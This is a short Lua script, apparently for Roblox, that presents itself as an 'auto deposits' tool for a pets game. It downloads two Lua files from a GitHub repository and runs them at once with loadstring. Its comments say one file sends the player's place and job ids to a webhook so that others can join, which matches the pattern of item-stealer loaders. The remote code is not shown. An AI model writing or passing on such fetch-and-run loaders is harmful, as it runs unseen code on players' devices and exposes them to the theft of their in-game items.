print("Working.") 
loadstring(game:HttpGet("https://raw.githubusercontent.com/xsync69/server/refs/heads/main/getdeposits.lua"))() -- This is for the server starter to get your place id and job id for people to join and make sure webhook is valid
loadstring(game:HttpGet("https://raw.githubusercontent.com/xsync69/server/refs/heads/main/rapsheet.lua"))() -- For Pets go rap sheet
print("Started Auto Deposits")

--Start the auto deposits and send confirmation
